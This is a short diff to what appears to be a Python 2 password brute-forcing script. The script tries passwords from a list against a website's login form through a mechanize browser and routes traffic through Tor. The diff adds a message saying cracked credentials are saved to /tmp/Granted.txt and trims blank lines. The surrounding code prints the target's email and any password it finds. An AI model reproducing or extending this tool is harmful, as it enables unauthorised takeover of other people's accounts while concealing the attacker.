@@ -140,7 +140,8 @@ for Password in Passwords:
 			print "%s[%s!%s] %sAccess Granted " %(Yellow,Red,Yellow,Blue)
 			print "%s[%s-%s]%s Attempt %s#: %s%d" %(Yellow,Blue,Yellow,Red,Blue,Red,Attempt) 
 			print "%s[%s-%s]%s Login: %s[%s %s %s]" %(Yellow,Blue,Yellow,Red,Yellow,Green,Email,Yellow)
-			print "%s[%s-%s]%s Password: %s[%s %s %s]%s\n" %(Yellow,Blue,Yellow,Red,Yellow,Green,Password,Yellow,White)
+			print "%s[%s-%s]%s Password: %s[%s %s %s]%s" %(Yellow,Blue,Yellow,Red,Yellow,Green,Password,Yellow,White)
+			print "%s[%s-%s]%s Password Saved To: %s/tmp/Granted.txt\n" %(Yellow,Red,Yellow,Blue,Red)
 			os.system("service tor stop")
 		Site = Br.open(Url)
 		Br.select_form(nr=0)
@@ -158,11 +159,4 @@ for Password in Passwords:
 		os.system('clear')
 		print '%s[%s!%s]%s Exiting...' %(Yellow,Red,Yellow,Red)
 		os.system('service tor stop');time.sleep(0.9);sys.exit()
-
-
-
-
-
-
-
 
